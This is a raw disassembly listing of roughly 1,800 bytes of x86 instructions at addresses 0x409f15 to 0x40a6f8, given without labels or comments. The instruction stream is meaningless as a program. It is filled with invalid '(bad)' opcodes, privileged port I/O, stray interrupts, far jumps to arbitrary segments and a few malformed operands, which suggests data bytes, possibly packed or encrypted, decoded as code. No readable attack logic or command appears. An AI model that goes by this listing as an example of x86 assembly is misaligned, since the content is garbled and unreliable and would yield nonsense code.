  409f15:	nop
  409f16:	mov    ch,0xc4
  409f18:	xchg   ecx,eax
  409f19:	enter  0xbb66,0xf
  409f1d:	jp     0x409f3e
  409f1f:	inc    edi
  409f20:	in     eax,dx
  409f21:	cld    
  409f22:	nop
  409f23:	lea    edx,[ebp-0x7067656f]
  409f29:	adc    dl,BYTE PTR [ebx*1+0x58e7df5b]
  409f30:	and    DWORD PTR [esi+0x2f],0xe4d1f208
  409f37:	inc    ebx
  409f38:	add    dh,dl
  409f3a:	sbb    bl,BYTE PTR [ebx]
  409f3c:	mov    ebp,0xf83ab02
  409f41:	jle    0x409f6e
  409f43:	std    
  409f44:	jl     0x409fa4
  409f46:	xchg   edx,eax
  409f47:	adc    DWORD PTR [edx-0x5c],0x8
  409f4b:	mov    al,ds:0xeadcf535
  409f50:	xor    BYTE PTR [ecx-0x1c4aafa6],0x7c
  409f57:	nop
  409f58:	paddusb mm1,QWORD PTR [edi]
  409f5b:	sub    edx,esi
  409f5d:	xchg   BYTE PTR [ebx-0x57152ede],dl
  409f63:	add    eax,0xaa8ec170
  409f68:	std    
  409f69:	cmp    esi,ecx
  409f6b:	cmp    eax,0xdba0189f
  409f70:	scas   eax,DWORD PTR es:[edi]
  409f71:	mov    ch,0x3e
  409f73:	pop    es
  409f74:	icebp  
  409f75:	(bad)  
  409f76:	jecxz  0x409f59
  409f78:	fisubr WORD PTR [edx-0x419b5e49]
  409f7e:	js     0x409f28
  409f80:	ret    0x2a73
  409f83:	mov    al,0x21
  409f85:	loop   0x409fcc
  409f87:	jns    0x409f31
  409f89:	cmp    bl,al
  409f8b:	jmp    0x409f8c
  409f8d:	or     esp,edi
  409f8f:	retf   0x2d82
  409f92:	jnp    0x409f91
  409f94:	inc    edx
  409f95:	cmp    eax,0x30d54c80
  409f9a:	mov    dh,0xc7
  409f9c:	sbb    al,0xf8
  409f9e:	mov    esp,0x38847ae5
  409fa3:	xor    esi,ebx
  409fa5:	pop    ebx
  409fa6:	outs   dx,BYTE PTR ds:[esi]
  409fa7:	sub    DWORD PTR [esi+0x38],edx
  409faa:	iret   
  409fab:	or     cl,BYTE PTR [edi]
  409fad:	or     DWORD PTR [eax],ecx
  409faf:	xchg   edi,eax
  409fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb1:	sbb    dh,bl
  409fb3:	pop    edx
  409fb4:	in     al,0x80
  409fb6:	mov    eax,0x8dab7b38
  409fbb:	jmp    0x35a7:0x4afad549
  409fc2:	add    BYTE PTR [edi+0x18],bh
  409fc5:	push   esi
  409fc6:	push   edx
  409fc7:	push   ss
  409fc8:	dec    edi
  409fc9:	fcomip st,st(2)
  409fcb:	mov    ds:0x2d45c675,eax
  409fd0:	call   0x59e7b012
  409fd5:	outs   dx,BYTE PTR ds:[esi]
  409fd6:	je     0x40a02d
  409fd8:	(bad)  
  409fda:	fdivr  QWORD PTR [ebx]
  409fdc:	es dec edi
  409fde:	sub    eax,0xbf0e4a20
  409fe3:	push   esp
  409fe4:	call   0x671bc6e6
  409fe9:	jbe    0x40a029
  409feb:	(bad)  
  409fec:	push   ebp
  409fed:	pop    ebx
  409fee:	sbb    ecx,ebx
  409ff0:	sub    al,0x7f
  409ff2:	daa    
  409ff3:	add    BYTE PTR [eax],0xda
  409ff6:	xchg   ecx,eax
  409ff7:	add    BYTE PTR [ebp+eax*1-0x5b3fa25d],ah
  409ffe:	and    edi,DWORD PTR [esi+ebp*4-0x78]
  40a002:	pop    ecx
  40a003:	dec    edx
  40a004:	int    0xee
  40a006:	push   eax
  40a007:	mov    al,ds:0xdc7321d0
  40a00c:	jo     0x40a03e
  40a00e:	mov    cl,0xc
  40a010:	or     eax,0xd77db16b
  40a015:	push   ds
  40a016:	jns    0x40a08e
  40a018:	sub    al,0x36
  40a01a:	rcl    eax,cl
  40a01c:	fidivr DWORD PTR [ecx+ebx*4+0x67b94d18]
  40a023:	gs add eax,0x8cf4016f
  40a029:	arpl   WORD PTR [ebx+eiz*1],sp
  40a02c:	out    dx,eax
  40a02d:	mov    al,ds:0x6b50440d
  40a032:	dec    ebx
  40a033:	mov    ebp,0xa9809909
  40a038:	gs jnp 0x40a01c
  40a03b:	adc    al,0xf3
  40a03d:	mov    ebp,0xda299214
  40a042:	fwait
  40a043:	pop    ss
  40a044:	lds    ebx,FWORD PTR cs:[edi]
  40a047:	jl     0x40a04b
  40a049:	ss in  al,dx
  40a04b:	mov    BYTE PTR [esi],al
  40a04d:	(bad)  
  40a04f:	or     eax,0xb80bd3de
  40a054:	cmp    eax,0x7f9d854d
  40a059:	xlat   BYTE PTR ds:[ebx]
  40a05a:	(bad)  
  40a05b:	aaa    
  40a05c:	push   0x69d90d39
  40a061:	leave  
  40a062:	(bad)  
  40a063:	in     eax,0x3f
  40a065:	cmp    eax,DWORD PTR [ebx]
  40a067:	in     al,0xa4
  40a069:	xchg   ecx,eax
  40a06a:	sbb    esi,DWORD PTR [ebx+0xf]
  40a06d:	and    ebx,edx
  40a06f:	jecxz  0x40a01c
  40a071:	or     eax,0x58d3555a
  40a076:	(bad)  
  40a077:	lea    esp,[ebx+edx*8+0x7244f61c]
  40a07e:	mov    edx,0x3b0fae96
  40a083:	pop    edi
  40a084:	adc    eax,0x6fd55834
  40a089:	sahf   
  40a08a:	cmc    
  40a08b:	jnp    0x40a088
  40a08d:	in     al,dx
  40a08e:	shl    bx,1
  40a091:	mov    al,ds:0xb92faed6
  40a096:	mov    al,0x2e
  40a098:	sti    
  40a099:	shl    al,0xa5
  40a09c:	mov    esp,0x2a6888ad
  40a0a1:	sbb    dh,BYTE PTR [edx-0x23]
  40a0a4:	idiv   DWORD PTR [edx+0x2750dfad]
  40a0aa:	add    esp,0x5fb10e9
  40a0b0:	and    al,0x15
  40a0b2:	sbb    ecx,ebx
  40a0b4:	mov    ebp,0x66a0d52b
  40a0b9:	mov    ecx,0xe13d4e94
  40a0be:	aaa    
  40a0bf:	sbb    DWORD PTR ds:0xa3e9650c,esp
  40a0c5:	inc    ecx
  40a0c6:	push   esp
  40a0c7:	or     dh,BYTE PTR [edi-0x1f744400]
  40a0cd:	ficom  WORD PTR [esi-0xc]
  40a0d0:	mov    esi,0xc3203648
  40a0d5:	popf   
  40a0d6:	ins    BYTE PTR es:[edi],dx
  40a0d7:	adc    BYTE PTR [eax],bl
  40a0d9:	xchg   edx,eax
  40a0da:	ds jge 0x40a12c
  40a0dd:	push   0x49
  40a0df:	out    0xcb,eax
  40a0e1:	popf   
  40a0e2:	push   edi
  40a0e3:	mov    BYTE PTR [ecx-0x23842463],ah
  40a0e9:	push   eax
  40a0ea:	xchg   esp,eax
  40a0eb:	jae    0x40a09c
  40a0ed:	arpl   WORD PTR [esi+eiz*8-0x264bff66],di
  40a0f4:	ss (bad) 
  40a0f6:	push   ss
  40a0f7:	pop    ds
  40a0f8:	cmc    
  40a0f9:	xchg   ecx,eax
  40a0fa:	pop    ebp
  40a0fb:	retf   
  40a0fc:	(bad)  
  40a0fd:	lock or bl,BYTE PTR ss:[ecx]
  40a101:	cmc    
  40a102:	out    0xa5,eax
  40a104:	cs mov al,0x2f
  40a107:	enter  0x7e1e,0xde
  40a10b:	cdq    
  40a10c:	aad    0x49
  40a10e:	sub    edx,DWORD PTR gs:[ecx]
  40a111:	xlat   BYTE PTR ds:[ebx]
  40a112:	jne    0x40a18e
  40a114:	retf   
  40a115:	dec    ebx
  40a116:	test   eax,0x3daa74f9
  40a11b:	das    
  40a11c:	xor    DWORD PTR [ecx+0x80a09c8],0xc43993a2
  40a126:	jle    0x40a137
  40a128:	shl    al,1
  40a12a:	dec    ecx
  40a12b:	jle    0x40a18c
  40a12d:	push   es
  40a12e:	and    al,0x1d
  40a130:	test   al,0xaa
  40a132:	jae    0x40a0c5
  40a134:	mov    al,0x61
  40a136:	fiadd  DWORD PTR [edi]
  40a138:	outs   dx,BYTE PTR ds:[esi]
  40a139:	adc    DWORD PTR [edx-0x5650b506],ebx
  40a13f:	cmp    ch,bl
  40a141:	mov    ?,ebx
  40a143:	and    eax,0x69964893
  40a148:	push   0xe0160d90
  40a14d:	iret   
  40a14e:	repz arpl WORD PTR [edi+0x7c],sp
  40a152:	sub    eax,DWORD PTR [esi+0x1d7dd0c0]
  40a158:	retf   0x92c1
  40a15b:	xor    DWORD PTR [ebp-0x39],ebx
  40a15e:	repz pop DWORD PTR [ecx+0x4486f4dc]
  40a165:	and    dh,BYTE PTR [eax]
  40a167:	lds    eax,FWORD PTR [ecx-0x72f206e8]
  40a16d:	retf   
  40a16e:	pop    eax
  40a16f:	inc    edi
  40a170:	cmp    DWORD PTR [eax],esi
  40a172:	stc    
  40a173:	jge    0x40a193
  40a175:	ret    0x8078
  40a178:	mov    ebx,0xb94d38be
  40a17d:	jae    0x40a152
  40a17f:	mov    eax,ds:0x2167eaf5
  40a184:	shl    al,1
  40a186:	(bad)  
  40a187:	rol    DWORD PTR [ebx+0x57777e03],0xbf
  40a18e:	aad    0x5f
  40a190:	out    0xc2,al
  40a192:	sub    eax,esi
  40a194:	inc    esp
  40a195:	mov    ebx,0x3120836c
  40a19a:	iret   
  40a19b:	mov    eax,0xf4e26fe3
  40a1a0:	popa   
  40a1a1:	add    edx,DWORD PTR cs:[esi+0x3838d1e8]
  40a1a8:	mov    BYTE PTR [bx+di-0x7e],0x51
  40a1ad:	jmp    0x7de2f768
  40a1b2:	and    BYTE PTR [ecx],0x96
  40a1b5:	sub    al,0x43
  40a1b7:	popa   
  40a1b8:	add    DWORD PTR [edi+0x6be4529],esp
  40a1be:	fisttp WORD PTR [eax-0x1a]
  40a1c1:	test   eax,0x16deebac
  40a1c6:	(bad)  
  40a1c7:	lods   al,BYTE PTR ds:[esi]
  40a1c8:	ror    DWORD PTR [esi],0xba
  40a1cb:	adc    BYTE PTR ds:0xb0e09cf7,al
  40a1d1:	stos   BYTE PTR es:[edi],al
  40a1d2:	mov    esi,0xfc33ec07
  40a1d7:	in     al,dx
  40a1d8:	inc    eax
  40a1d9:	data16 aam 0x9a
  40a1dc:	pop    ds
  40a1dd:	xchg   ecx,eax
  40a1de:	imul   ebx,DWORD PTR [edi-0x3f],0x4f
  40a1e2:	adc    eax,0xeeb829f5
  40a1e7:	dec    ebp
  40a1e8:	mov    dh,0x2c
  40a1ea:	pusha  
  40a1eb:	dec    edi
  40a1ec:	jecxz  0x40a22b
  40a1ee:	inc    esp
  40a1ef:	outs   dx,BYTE PTR ds:[esi]
  40a1f0:	or     eax,DWORD PTR [ebx-0x69ea1cdc]
  40a1f6:	mov    edx,0xc5ffcf4
  40a1fc:	test   al,0x40
  40a1fe:	dec    esp
  40a1ff:	dec    ebp
  40a200:	(bad)  
  40a201:	xor    edi,edi
  40a203:	jne    0x40a190
  40a205:	cmp    DWORD PTR [edi],edx
  40a207:	inc    esi
  40a208:	in     eax,dx
  40a209:	xchg   ecx,eax
  40a20a:	mov    al,ds:0xc69fc72c
  40a20f:	mov    bh,0xc6
  40a211:	push   esp
  40a212:	(bad)  
  40a213:	jmp    0xea96241f
  40a218:	mov    WORD PTR [esi+0x5a],?
  40a21b:	icebp  
  40a21c:	push   esp
  40a21d:	or     edi,eax
  40a21f:	mov    edx,DWORD PTR [esi]
  40a221:	add    al,0x37
  40a223:	repnz inc esi
  40a225:	mov    es,WORD PTR [edx+0x6]
  40a228:	pop    edx
  40a229:	test   DWORD PTR [edi-0x6d],esp
  40a22c:	push   ss
  40a22d:	xchg   esi,eax
  40a22e:	mov    bh,0x96
  40a230:	cld    
  40a231:	mov    dh,ch
  40a233:	jmp    0xbdb48f46
  40a238:	add    al,0x83
  40a23a:	jp     0x40a1f1
  40a23c:	dec    edi
  40a23d:	es in  al,dx
  40a23f:	inc    esp
  40a240:	adc    al,ah
  40a242:	inc    ecx
  40a243:	push   ebp
  40a244:	sahf   
  40a245:	into   
  40a246:	test   BYTE PTR [eax+edi*4-0x24],bl
  40a24a:	daa    
  40a24b:	xchg   edi,eax
  40a24c:	pop    edi
  40a24d:	xchg   DWORD PTR [esp+edi*2],edx
  40a250:	push   ebx
  40a251:	mov    eax,0x645a2c7c
  40a256:	adc    edi,esi
  40a258:	mov    ds:0xfefdfb46,eax
  40a25d:	adc    dh,BYTE PTR [ecx+0x65b082e9]
  40a263:	fcomp  QWORD PTR [ecx]
  40a265:	pop    esp
  40a266:	push   ebp
  40a267:	fidiv  WORD PTR [edi+ebx*1-0xd4fa5ce]
  40a26e:	(bad)  
  40a26f:	cld    
  40a270:	xchg   BYTE PTR [edx+0x5a],bl
  40a273:	mov    edi,0x744a64f6
  40a278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a279:	push   ds
  40a27a:	xor    eax,0x4bda3b7c
  40a27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a280:	hlt    
  40a281:	retf   
  40a282:	mov    WORD PTR [edx-0xe1383fe],es
  40a288:	jecxz  0x40a252
  40a28a:	adc    bl,BYTE PTR [edi]
  40a28c:	push   ecx
  40a28d:	mov    WORD PTR [eax+eax*2-0x17],fs
  40a291:	sub    eax,0x5bfe4d33
  40a296:	jno    0x40a2e6
  40a298:	dec    esi
  40a299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a29a:	test   DWORD PTR [edx-0x3e43b18e],0xa481c856
  40a2a4:	aam    0x8f
  40a2a6:	loope  0x40a2f5
  40a2a8:	adc    eax,0x824aafd6
  40a2ad:	dec    edx
  40a2ae:	xchg   ebx,eax
  40a2af:	mov    cl,0xae
  40a2b1:	enter  0xfcc1,0x82
  40a2b5:	jmp    0xf375af51
  40a2ba:	fwait
  40a2bb:	imul   edi,DWORD PTR [eax-0x6edb165b],0x15
  40a2c2:	xchg   BYTE PTR [edi-0x703f82c0],al
  40a2c8:	mov    DWORD PTR [edi-0x56],ebx
  40a2cb:	xor    ebx,esi
  40a2cd:	int    0xdc
  40a2cf:	mov    ebx,0x15728ac
  40a2d4:	jne    0x40a327
  40a2d6:	mov    ah,0x55
  40a2d8:	inc    edi
  40a2d9:	scas   al,BYTE PTR es:[edi]
  40a2da:	dec    esi
  40a2db:	or     ebp,edi
  40a2dd:	xor    cl,BYTE PTR [edx-0x5dbcb64e]
  40a2e3:	cs loop 0x40a29c
  40a2e6:	xchg   ebx,esp
  40a2e8:	mov    ds:0x5865f33,al
  40a2ed:	fcmove st,st(2)
  40a2ef:	pushf  
  40a2f0:	pop    es
  40a2f1:	mov    al,ds:0xbe4b28fd
  40a2f6:	fcom   QWORD PTR [ebp-0x2a7863ad]
  40a2fc:	jbe    0x40a310
  40a2fe:	aam    0x24
  40a300:	lock std 
  40a302:	ja     0x40a322
  40a304:	jno    0x40a378
  40a306:	(bad)  
  40a307:	in     al,0x82
  40a309:	cmp    eax,0xf602ed29
  40a30e:	push   cs
  40a30f:	mov    al,0xe
  40a311:	sbb    DWORD PTR [esi+0x68],ebp
  40a314:	test   al,0xf9
  40a316:	jmp    0x40a2f9
  40a318:	mov    ebp,0x13f8c270
  40a31d:	js     0x40a2c5
  40a31f:	mov    eax,0x50b71e8b
  40a324:	mov    dh,0x8e
  40a326:	or     eax,DWORD PTR [edi-0x44d3255e]
  40a32c:	retf   
  40a32d:	adc    bl,cl
  40a32f:	xor    ebp,DWORD PTR [ebp-0x3dec59a6]
  40a335:	push   0xfffffff1
  40a337:	out    dx,al
  40a338:	mov    dl,0xfe
  40a33a:	mov    esi,0xd5c47570
  40a33f:	jb     0x40a36a
  40a341:	outs   dx,DWORD PTR ds:[esi]
  40a342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a343:	cwde   
  40a344:	stos   BYTE PTR es:[edi],al
  40a345:	push   esi
  40a346:	mov    ebp,0x6d3725c9
  40a34b:	test   DWORD PTR [edi+0x59e776fd],edx
  40a351:	aam    0x36
  40a353:	mov    gs,WORD PTR [edi]
  40a355:	cmp    edx,DWORD PTR [ebx+ebp*8]
  40a358:	cmp    dh,cl
  40a35a:	js     0x40a3c3
  40a35c:	mov    bl,0x83
  40a35e:	ror    BYTE PTR es:[edi+0x23],0x78
  40a363:	cdq    
  40a364:	(bad)  
  40a365:	into   
  40a366:	cmc    
  40a367:	(bad)
  40a36a:	out    dx,al
  40a36b:	lods   eax,DWORD PTR ds:[esi]
  40a36c:	cmp    ah,ch
  40a36e:	push   es
  40a36f:	sbb    dl,BYTE PTR [edx+0xec8c159]
  40a375:	ja     0x40a392
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	stc    
  40a379:	test   BYTE PTR [eax],bh
  40a37b:	cmc    
  40a37c:	lds    ebx,FWORD PTR [ebp+eiz*1-0x934c9d8]
  40a383:	mov    esi,0x9c336a41
  40a388:	std    
  40a389:	xchg   esp,eax
  40a38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a38b:	dec    ebx
  40a38c:	popf   
  40a38d:	xlat   BYTE PTR ds:[ebx]
  40a38e:	fsubr  st,st(6)
  40a390:	cmp    ch,ah
  40a392:	pusha  
  40a393:	xor    eax,0x63b81c0d
  40a398:	cmp    DWORD PTR [ebx],edi
  40a39a:	add    edx,ebx
  40a39c:	push   es
  40a39d:	push   esp
  40a39e:	retf   
  40a39f:	mov    esp,0xa6fafc8
  40a3a4:	daa    
  40a3a5:	imul   ecx,ebx,0x70d3837c
  40a3ab:	pop    edi
  40a3ac:	std    
  40a3ad:	retf   
  40a3ae:	mov    DWORD PTR [ebx+0x36],ecx
  40a3b1:	jae    0x40a374
  40a3b3:	inc    edx
  40a3b4:	(bad)  
  40a3b5:	test   BYTE PTR ds:[edi+ebx*8-0x7b],ah
  40a3ba:	pop    esp
  40a3bb:	mov    ah,0xd3
  40a3bd:	aaa    
  40a3be:	mov    eax,0xca906098
  40a3c3:	push   ecx
  40a3c4:	dec    esp
  40a3c5:	inc    edx
  40a3c6:	popf   
  40a3c7:	pop    ebx
  40a3c8:	mov    dl,0x93
  40a3ca:	inc    ecx
  40a3cb:	jbe    0x865f2bb9
  40a3d1:	pop    edi
  40a3d2:	nop
  40a3d3:	add    edx,DWORD PTR ds:0x91660b45
  40a3d9:	add    al,0x75
  40a3db:	inc    ebp
  40a3dc:	fild   WORD PTR [edx+0x5a5b443b]
  40a3e2:	mov    eax,0x45580cfa
  40a3e7:	repz sub al,0xdc
  40a3eb:	and    bh,BYTE PTR [ecx+0x8]
  40a3ee:	cmp    al,0xeb
  40a3f0:	jno    0x40a3bf
  40a3f2:	xchg   edx,eax
  40a3f3:	imul   ebx,edx,0xffffff99
  40a3f6:	bound  esp,QWORD PTR [eax-0x46]
  40a3f9:	dec    di
  40a3fb:	push   ds
  40a3fc:	int    0x40
  40a3fe:	test   al,0xfd
  40a400:	xor    eax,0xfa9bdebf
  40a405:	inc    ebx
  40a406:	std    
  40a407:	shl    DWORD PTR [eax+0x46],cl
  40a40a:	mov    ecx,0xaa90081b
  40a40f:	pushf  
  40a410:	fwait
  40a411:	or     eax,0x2e57e2ea
  40a416:	inc    edi
  40a417:	xchg   DWORD PTR ds:[eax-0x6f93190c],ecx
  40a41e:	js     0x40a492
  40a420:	ja     0x40a3b7
  40a422:	pusha  
  40a423:	sub    al,0x7f
  40a425:	nop
  40a426:	std    
  40a427:	je     0x40a456
  40a429:	inc    esp
  40a42a:	push   eax
  40a42b:	adc    esi,DWORD PTR [esp+ecx*4+0x5b]
  40a42f:	(bad)  
  40a430:	das    
  40a431:	cdq    
  40a432:	and    DWORD PTR [ebp-0x13],eax
  40a435:	retf   
  40a436:	ja     0x40a403
  40a438:	push   0x9d570ded
  40a43d:	inc    edi
  40a43e:	adc    BYTE PTR [edi+0x4a25adb4],bh
  40a444:	mov    al,0xb5
  40a446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a447:	and    BYTE PTR [eax-0x4005bd54],ah
  40a44d:	repz int3 
  40a44f:	and    ebp,eax
  40a451:	mov    ch,0x2d
  40a453:	nop
  40a454:	mov    bh,cl
  40a456:	ins    DWORD PTR es:[edi],dx
  40a457:	cmp    edi,eax
  40a459:	imul   esi,DWORD PTR [ebx+0x1c],0xa2c17288
  40a460:	setl   bh
  40a463:	sbb    eax,0xc3c995e8
  40a468:	mov    esi,0xbce4dfe8
  40a46d:	xor    dl,BYTE PTR cs:[eax-0x1a401873]
  40a474:	adc    eax,0x84b31ac9
  40a479:	test   eax,ecx
  40a47b:	loopne 0x40a440
  40a47d:	mov    bh,0xe3
  40a47f:	fld    DWORD PTR [ebx+esi*8+0x27cc776d]
  40a486:	xchg   edi,eax
  40a487:	int    0xfa
  40a489:	cwde   
  40a48a:	sub    BYTE PTR [edx-0x4b],dl
  40a48d:	retf   
  40a48e:	jns    0x40a44d
  40a490:	cli    
  40a491:	cmc    
  40a492:	push   ebp
  40a493:	adc    al,0x6c
  40a495:	imul   esi,esi,0xae8ac830
  40a49b:	aaa    
  40a49c:	js     0x40a499
  40a49e:	fisub  WORD PTR [ebp-0x4d9c4624]
  40a4a4:	out    dx,eax
  40a4a5:	repz repz sbb DWORD PTR [eax+ebp*8-0x79],ebx
  40a4ab:	loopne 0x40a45f
  40a4ad:	sbb    esi,ebx
  40a4af:	push   edx
  40a4b0:	sbb    al,0x87
  40a4b2:	cwde   
  40a4b3:	repnz push eax
  40a4b5:	mov    ecx,0x8332fb31
  40a4ba:	test   bh,bh
  40a4bc:	cmp    eax,0x8707915f
  40a4c1:	xchg   esi,eax
  40a4c2:	xor    edx,ebp
  40a4c4:	sbb    edx,ecx
  40a4c6:	cdq    
  40a4c7:	mov    esp,0x17611125
  40a4cc:	popa   
  40a4cd:	loop   0x40a507
  40a4cf:	and    bl,BYTE PTR [edi]
  40a4d1:	sbb    al,0xa3
  40a4d3:	(bad)  
  40a4d4:	test   DWORD PTR [ecx+0x5f823194],edx
  40a4da:	or     eax,0x2fa2bc0d
  40a4df:	test   al,0x4d
  40a4e1:	sar    DWORD PTR [edi+0x27],1
  40a4e4:	test   BYTE PTR [edi+eiz*2+0x3db86c12],cl
  40a4eb:	mov    al,0x41
  40a4ed:	sub    BYTE PTR [edx-0x7fc761fd],bl
  40a4f3:	adc    dl,BYTE PTR [edi]
  40a4f5:	fs int3 
  40a4f7:	jnp    0x40a4cc
  40a4f9:	inc    eax
  40a4fa:	sub    bl,cl
  40a4fc:	xor    BYTE PTR [ecx-0x3],cl
  40a4ff:	jbe    0x40a530
  40a501:	sbb    al,0x9e
  40a503:	inc    ebp
  40a504:	pop    ss
  40a505:	fwait
  40a506:	or     DWORD PTR [edx-0x414fd940],eax
  40a50c:	dec    ecx
  40a50d:	ja     0x40a4a2
  40a50f:	out    0xe7,al
  40a511:	test   DWORD PTR [edi],ebx
  40a513:	hlt    
  40a514:	(bad)  
  40a515:	test   DWORD PTR [ebp-0x68ee6457],0x50062650
  40a51f:	sti    
  40a520:	push   esp
  40a521:	add    al,0x7c
  40a523:	stos   DWORD PTR es:[edi],eax
  40a524:	call   0x271110d6
  40a529:	repnz inc edi
  40a52b:	(bad)  
  40a52c:	fdiv   DWORD PTR [ebx]
  40a52e:	lds    edi,FWORD PTR [esp+ebp*1+0x2a4d99f1]
  40a535:	cdq    
  40a536:	jbe    0x40a562
  40a538:	jb     0x40a591
  40a53a:	pop    ebp
  40a53b:	pop    esp
  40a53c:	xor    BYTE PTR [edi],dh
  40a53e:	ror    BYTE PTR [edx],1
  40a540:	div    DWORD PTR [ebx-0x39]
  40a543:	lods   eax,DWORD PTR ds:[esi]
  40a544:	loope  0x40a5bf
  40a546:	jecxz  0x40a502
  40a548:	sbb    bl,ch
  40a54a:	xor    eax,0x4d453c4f
  40a54f:	xor    eax,0xdfe714da
  40a554:	lahf   
  40a555:	inc    edi
  40a556:	cld    
  40a557:	xchg   ebp,eax
  40a558:	leave  
  40a559:	or     ecx,DWORD PTR [ebx]
  40a55b:	push   ds
  40a55c:	lods   al,BYTE PTR ds:[esi]
  40a55d:	mov    dh,0x29
  40a55f:	cmp    ch,al
  40a561:	mov    bl,0x54
  40a563:	mov    ah,0xb0
  40a565:	push   0x1a71508
  40a56a:	out    dx,eax
  40a56b:	mov    edi,0xdb1802ac
  40a570:	push   eax
  40a571:	mov    ds:0x64ab8682,al
  40a576:	stc    
  40a577:	repnz xchg ebp,eax
  40a579:	ret    0x1393
  40a57c:	stos   DWORD PTR es:[edi],eax
  40a57d:	sahf   
  40a57e:	pop    ebx
  40a580:	and    BYTE PTR [esi+0x182fbba4],dl
  40a586:	mov    bh,BYTE PTR [esi+0x798ea84]
  40a58c:	(bad)  
  40a58d:	push   ebp
  40a58e:	push   edi
  40a58f:	adc    ecx,DWORD PTR [edi-0x4d]
  40a592:	scas   al,BYTE PTR es:[edi]
  40a593:	or     al,cl
  40a595:	outs   dx,BYTE PTR ds:[esi]
  40a596:	ds ins DWORD PTR es:[edi],dx
  40a598:	imul   ebp,DWORD PTR [esi+0x187ce3b7],0xba87e976
  40a5a2:	pop    edx
  40a5a3:	lds    eax,FWORD PTR [ecx-0x66]
  40a5a6:	jmp    0x93fc:0xc10f04bd
  40a5ad:	mov    esi,DWORD PTR [ecx]
  40a5af:	test   eax,0xc582ab72
  40a5b4:	rcr    DWORD PTR [edi],1
  40a5b6:	and    ebx,edi
  40a5b8:	mov    edi,esp
  40a5ba:	es pusha 
  40a5bc:	test   ch,bl
  40a5be:	call   0x4a106c3e
  40a5c3:	cmp    al,0x13
  40a5c5:	fidiv  WORD PTR [edi+0x462f3349]
  40a5cb:	minps  xmm6,xmm1
  40a5ce:	fwait
  40a5cf:	xor    BYTE PTR [ebp+0x14],0xeb
  40a5d3:	add    BYTE PTR [edx+0x45f53295],cl
  40a5d9:	int    0xfe
  40a5db:	(bad)  
  40a5dc:	mov    dh,0xcd
  40a5de:	je     0x40a639
  40a5e0:	mov    esp,0x833be026
  40a5e5:	cli    
  40a5e6:	jns    0x40a627
  40a5e8:	mov    al,ds:0xcdc26183
  40a5ed:	jmp    0xe331:0xc316f091
  40a5f4:	mov    ah,0x73
  40a5f6:	cld    
  40a5f7:	imul   edx,DWORD PTR [ebx+eiz*8],0xffffffd6
  40a5fb:	mov    ch,0x39
  40a5fd:	int    0x4
  40a5ff:	bound  ecx,QWORD PTR [edi]
  40a601:	js     0x40a5ae
  40a603:	mov    ds:0xec8858f4,eax
  40a608:	or     al,0x39
  40a60a:	sub    esp,esi
  40a60c:	in     al,0x45
  40a60e:	shl    DWORD PTR [ebx-0x3e],1
  40a611:	in     al,0xcd
  40a613:	int3   
  40a614:	cs retf 0x90ef
  40a618:	sbb    DWORD PTR [esi+esi*1-0x2c166c86],edx
  40a61f:	add    DWORD PTR [ebp+0x5bb76582],0x85c6954b
  40a629:	jp     0x40a66b
  40a62b:	leave  
  40a62c:	pop    edi
  40a62d:	push   edx
  40a62e:	test   eax,0xc430ccab
  40a633:	(bad)  
  40a634:	xor    cl,BYTE PTR [edi-0x21554d76]
  40a63a:	icebp  
  40a63b:	or     al,0xaf
  40a63d:	popa   
  40a63e:	jl     0x40a5ec
  40a640:	dec    ebx
  40a641:	aad    0x60
  40a643:	push   esp
  40a644:	push   ss
  40a645:	push   ecx
  40a646:	and    ah,BYTE PTR [ebp+0xc4d06fe]
  40a64c:	push   esi
  40a64d:	push   0xbf7703e7
  40a652:	mov    al,BYTE PTR [ebx]
  40a654:	daa    
  40a655:	dec    ebp
  40a656:	or     ch,BYTE PTR [ecx-0x3b]
  40a659:	int3   
  40a65a:	sbb    cl,dl
  40a65c:	add    cl,BYTE PTR fs:[edx-0x54]
  40a660:	push   esp
  40a661:	xor    eax,0x1007adc1
  40a666:	xchg   BYTE PTR [edi],ah
  40a668:	test   dh,cl
  40a66a:	mov    DWORD PTR ds:0xa7777c26,ebp
  40a670:	mov    ch,al
  40a672:	jmp    0x40a6bf
  40a674:	clc    
  40a675:	mov    ch,0x61
  40a677:	(bad)  
  40a678:	ds and ch,ch
  40a67b:	(bad)  [ebx+0x16]
  40a67e:	adc    edx,DWORD PTR [edi+0x58]
  40a681:	mov    edi,0xcdfcdadb
  40a686:	dec    ecx
  40a687:	jnp    0x40a617
  40a689:	call   0xa75c:0x6b31380
  40a690:	xor    BYTE PTR [eax+0x59],0x12
  40a694:	ss xchg ecx,eax
  40a696:	ins    DWORD PTR es:[edi],dx
  40a697:	sbb    BYTE PTR [eax-0x63],0xf4
  40a69b:	pushf  
  40a69c:	or     esp,edi
  40a69e:	daa    
  40a69f:	xor    esi,DWORD PTR [ebp-0x79fc2259]
  40a6a5:	dec    eax
  40a6a6:	xchg   esi,eax
  40a6a7:	and    dl,bl
  40a6a9:	jmp    0x4de9:0xd7394a44
  40a6b0:	push   edi
  40a6b1:	xor    BYTE PTR [edx-0xd74dab5],bh
  40a6b7:	xchg   DWORD PTR [ecx],ecx
  40a6b9:	push   0x52270c99
  40a6be:	jge    0x40a6d7
  40a6c0:	cmp    eax,0x75885795
  40a6c5:	mov    WORD PTR [ebx+0x3f8872c],ds
  40a6cb:	sar    bh,0x56
  40a6ce:	mov    cl,0x1b
  40a6d0:	mov    ebp,0x117224b6
  40a6d5:	inc    esp
  40a6d6:	xor    ch,bl
  40a6d8:	mov    al,0x51
  40a6da:	stos   BYTE PTR es:[edi],al
  40a6db:	mov    BYTE PTR [edx+0x1],dl
  40a6de:	cmp    ebp,DWORD PTR [edx-0x478d1952]
  40a6e4:	push   esi
  40a6e5:	pop    ebp
  40a6e6:	arpl   WORD PTR [eax+0x32833178],dx
  40a6ec:	xlat   BYTE PTR ds:[ebx]
  40a6ed:	mov    al,0x65
  40a6ef:	into   
  40a6f0:	(bad)  
  40a6f1:	aaa    
  40a6f2:	sbb    ebp,DWORD PTR [edi+0x3b2005d7]
  40a6f8:	pop    ds
